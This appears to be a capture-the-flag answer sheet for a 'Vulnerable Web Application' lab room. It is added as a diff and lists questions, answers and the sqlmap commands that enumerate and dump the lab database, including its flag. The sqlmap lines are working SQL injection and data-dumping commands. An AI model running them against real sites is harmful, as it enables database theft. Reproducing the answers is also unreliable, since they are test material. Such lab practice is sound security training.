@@ -1,0 +1,25 @@
+
+							Vulnerable Web Application 
+							===========================
+
+1. Set the url to the machine ip, and run the command
+ans: auto-complete
+
+2. How many types of sqli is the site vulnerable too?
+ans: 3
+command: sqlmap -u http://10.10.196.152 --forms --batch > sqlvuln.txt
+
+3. Dump the database.
+ans: auto-complete
+
+4. What is the name of the database? 
+ans: tests
+command: sqlmap -u http://10.10.196.152 --forms --batch --dbs > sqldatabase.txt
+
+5. How many tables are in the database?
+ans: 3
+command: sqlmap -u http://10.10.196.152 --forms --batch --tables -D tests > sqldatatables.txt
+
+6. What is the value of the flag?
+ans: foundme
+command: sqlmap -u http://10.10.196.152 --forms --batch --dump -D tests -T lol -C flag > sqlflag.txt
